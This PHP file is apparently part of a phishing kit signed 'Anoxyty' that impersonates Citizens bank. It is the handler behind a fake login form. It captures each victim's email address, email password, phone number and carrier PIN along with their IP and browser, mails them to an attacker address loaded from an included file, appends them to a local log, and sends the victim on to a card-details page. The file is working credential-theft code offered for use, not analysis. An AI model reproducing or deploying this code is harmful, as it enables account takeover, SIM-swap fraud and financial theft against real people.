<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/

	ob_start();
session_start();
	include 'yours.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['exxx'] ) ) {
		
		$_SESSION['exxx'] 	  = $_POST['exxx'];
		$_SESSION['psss'] 	  = $_POST['psss'];
		$_SESSION['phn'] 	  = $_POST['phn'];
		$_SESSION['cpin'] 	  = $_POST['cpin'];

		$code = <<<EOT
============== [ CITIZENS By Anoxyty | ]🔥 ==============
[Email Address] 		: {$_SESSION['exxx']}
[Email Password]		: {$_SESSION['psss']}
[Phone Number]		: {$_SESSION['phn']}
[Phone Carrier Pin]		: {$_SESSION['cpin']}
	--------🔑 I N F O | I P 🔑 --------
IP		: $ip
IP lookup		: https://ip-api.com/$ip
OS		: $useragent

============= [ ./💼 CITIZENS By Anoxyty💼 ] =============
\r\n\r\n
EOT;

		$subject = "💼 CITIZENS Email Access By Anoxyty💼  From $ip";
        $headers = "From: 🍁Anoxyty🍁 <wellsby@anoxyty.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($yours,$subject,$code,$headers);

		$save = fopen("stored.txt","a+");
        fwrite($save,$code);
        fclose($save);

        header("Location: crd.php?&sessionid={$_SESSION['randString']}&ue");
        exit();
	} else {
		header("Location: index.php");
		exit();
	}
?>